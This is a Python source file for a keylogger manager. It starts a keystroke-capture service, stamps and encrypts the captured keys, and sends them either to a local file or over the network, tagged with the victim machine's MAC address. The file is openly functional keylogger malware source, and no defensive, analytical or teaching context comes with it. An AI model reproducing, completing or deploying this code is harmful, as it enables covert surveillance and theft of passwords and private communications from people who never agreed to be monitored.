import json
import sys
sys.path.append('../../utilities/encryptionDecryption')
from encryption import Encryption
import uuid
from logger.keylogger.keylogger_service import KeyloggerService
from logger.writer.FileWriter import FileWriter
from logger.writer.NetWorkWriter import NetWorkWriter
from time import sleep
from datetime import datetime
import logging

logging.basicConfig(filename='../log.txt', level=logging.DEBUG, format='%(asctime)s - %(message)s', filemode='a')


class KeyLoggerManager:
    """
    Manages the keylogger, encryption, and data writing processes.

    Attributes:
    -----------
    mac_address : str
        The unique MAC address of the machine.
    writer : IWriter
        The writer used to store or send the logs.
    keylogger : KeyloggerService
        The keylogger service instance.
    encoder : Encryption
        The encryption instance for securing log data.
    flag : bool
        Controls the logging loop.
    """

    def __init__(self):
        with open('../config.json', 'r') as f:
            self.config = json.load(f)
        self.mac_address = hex(uuid.getnode())
        self.writer = FileWriter() if self.config['writer'] == 'file_writer' else NetWorkWriter()
        self.keylogger = KeyloggerService()
        self.encoder = Encryption(open('../../utilities/key.txt', 'r').read())
        self.flag = True

    def start(self):
        """
        Starts the keylogger process.

        Logs the start of keylogging and handles interruption.
        """
        try:
            self.keylogger.start_logging()
            logging.info('Logging started')
        except KeyboardInterrupt:
            self.keylogger.stop_logging()
            self.flag = False

    def handle_logging(self):
        """
        Continuously fetches logged keys, encrypts them, and writes them to storage.

        - If "stop" is detected in logs, logging stops.
        - Adds a timestamp to the logs before encryption.
        - Writes the encrypted data to a file or network storage.

        Runs in a loop until `self.flag` is set to False.
        """
        while self.flag:
            logged_keys = "".join(self.keylogger.get_logged_keys())
            if logged_keys:
                logged_keys = datetime.now().strftime('%H:%M:%S %d/%m/%Y\n') + logged_keys
                try:
                    encrypted_data = self.encoder.encryption(logged_keys)
                    self.writer.send_data(encrypted_data, self.mac_address)
                    logging.info(f'Data written to {self.writer}')
                except Exception as e:
                    logging.error(e)
                    return
            sleep(self.config['sleep_seconds'])
        self.keylogger.stop_logging()
        self.flag = False
        logging.info('Logging stopped')

